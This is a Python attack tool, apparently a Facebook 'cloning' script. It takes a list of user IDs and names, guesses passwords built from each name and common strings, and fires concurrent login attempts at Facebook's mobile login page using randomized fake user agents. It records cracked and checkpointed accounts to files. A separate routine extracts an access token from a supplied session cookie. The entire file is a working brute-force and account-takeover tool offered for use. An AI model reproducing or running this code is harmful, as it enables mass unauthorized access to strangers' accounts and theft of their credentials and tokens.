#CODING BY UTF-8
#AlpinCompiler
#Owner: CHARSI

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

import os, sys, time, re, json, requests, bs4, random, calendar, datetime, subprocess, logging
from concurrent.futures import ThreadPoolExecutor as khamdihiXD

from datetime import datetime
from bs4 import BeautifulSoup as parser
ct = datetime.now()
n = ct.month
bulan_ = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

# Colors
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
U = '\x1b[1;95m' # PURPLE
O = '\x1b[1;96m' # LIGHT BLUE
N = '\x1b[0m'    # NORMAL

user, mi, status_foll, cr, ok, cp, id, loop, looping = [], [], [], [], [], [], [], 0, 1
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
waktu = '%s-%s-%s'%(ha,op,ta)

# --- ADVANCED USER AGENTS ---
ugen = []
for x in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14'])
    c='SM-G'
    d=random.randrange(900,999)
    e=random.choice(['F','B','U','W','N'])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(110,126)
    h='0'
    i=random.randrange(5000,6500)
    j=random.randrange(100,200)
    k='Mobile Safari/537.36'
    uagent=f'{aa} {b}; {c}{d}{e}) {f}{g}.{h}.{i}.{j} {k}'
    ugen.append(uagent)

def banner():
	os.system('clear')
	# Naya Big Text Logo
	print(f"""{H}
  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ•”â• â• â• â•šâ–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â• â•šâ–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•— â•šâ• â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•—â–ˆâ–ˆâ•‘
  â•šâ• â• â• â• â•šâ•šâ• â•   â•šâ• â•šâ• â•   â•šâ• â•šâ• â•   â•šâ• â•šâ• â• â• â• â•šâ•šâ• â• 
 {P}--------------------------------------------------
 {H} [+] OWNER    : {K}CHARSI
 {H} [+] GITHUB   : {K}github.com/CHARSI-PRO
 {H} [+] STATUS   : {H}FIRE ON CLONING
 {P}--------------------------------------------------""")

class Charsi_Main:
	def __init__(self):
		self.id = []

	def menu(self):
		banner()
		print(f" {H}[01] File Cloning {P}(Super Fast)")
		print(f" {H}[02] Public Cloning {P}(Cookie)")
		print(f" {H}[03] Check Results {P}(OK/CP)")
		print(f" {H}[00] Exit")
		print(f" {P}--------------------------------------------------")
		ch = input(f" {P}[?] Choose Option: ")
		if ch in ['1','01']:
			self.file_cloning()
		elif ch in ['2','02']:
			login()
		elif ch in ['3','03']:
			self.results()
		else:
			exit()

	def file_cloning(self):
		banner()
		print(f" {H}[+] Put File Path (e.g /sdcard/ids.txt)")
		file = input(f" {P}[?] Path: ")
		try:
			id_list = open(file, 'r').read().splitlines()
			print(f" {H}[+] Total IDs Found: {len(id_list)}")
			print(f" {P}--------------------------------------------------")
			with tred(max_workers=60) as charsi_pool:
				for user in id_list:
					try:
						uid, name = user.split('|')
					except:
						uid = user; name = "Facebook User"
					
					# Passwords Logic
					first = name.split(' ')[0].lower()
					pwx = [name, name+'123', name+'1234', '786786', 'pakistan', 'khan123', first+'123', first+'1234', first+'12345']
					charsi_pool.submit(self.engine, uid, pwx, len(id_list))
			
			print(f"\n {P}--------------------------------------------------")
			print(f" {H}[+] Cloning Complete. OK:{len(ok)} CP:{len(cp)}")
			exit()
		except FileNotFoundError:
			print(f" {M}[!] File Path Galat Hai!"); time.sleep(2); self.menu()

	def engine(self, user, pwx, total):
		global loop, ok, cp
		sys.stdout.write(f'\r {P}[CHARSI-FIRE] {loop}/{total} OK:{H}{len(ok)} {P}CP:{K}{len(cp)} '); sys.stdout.flush()
		for pw in pwx:
			try:
				ua = random.choice(ugen)
				ses = requests.Session()
				free_fb = ses.get('https://mbasic.facebook.com').text
				log_data = {
					"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
					"email":user, "pass":pw, "login":"Log In"
				}
				header = {
					'authority': 'mbasic.facebook.com',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
					'user-agent': ua,
				}
				ses.post('https://mbasic.facebook.com/login/device-based/regular/login/', data=log_data, headers=header)
				if 'c_user' in ses.cookies.get_dict():
					print(f'\r {H}â•šâ• â• â• â—¨ [CHARSI-OK] {user} | {pw}{N}')
					ok.append(user); open('Ok.txt','a').write(f'{user}|{pw}\n'); break
				elif 'checkpoint' in ses.cookies.get_dict():
					print(f'\r {K}â•šâ• â• â• â—§ [CHARSI-CP] {user} | {pw}{N}')
					cp.append(user); open('Cp.txt','a').write(f'{user}|{pw}\n'); break
			except: pass
		loop += 1

	def results(self):
		print(f" {H}[1] Check OK Results")
		print(f" {K}[2] Check CP Results")
		res = input(" Selection: ")
		if res == '1':
			try: print(open('Ok.txt','r').read())
			except: print("No OK IDs")
		else:
			try: print(open('Cp.txt','r').read())
			except: print("No CP IDs")

def login():
	banner()
	cookie=input("%s[+] ENTER COOKIE : %s"%(H,K))
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": random.choice(ugen),"referer": "https://www.facebook.com/"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		open("token.x", "w").write(find_token.group(1))
		open("cookies.x", "w").write(cookie)
		print('\033[92;1m LOGIN SUCCESSFUL'); time.sleep(2); Charsi_Main().menu()
	except:
		print('%s# INVALID COOKIE'%(M)); exit()

if __name__ == '__main__':
	Charsi_Main().menu()
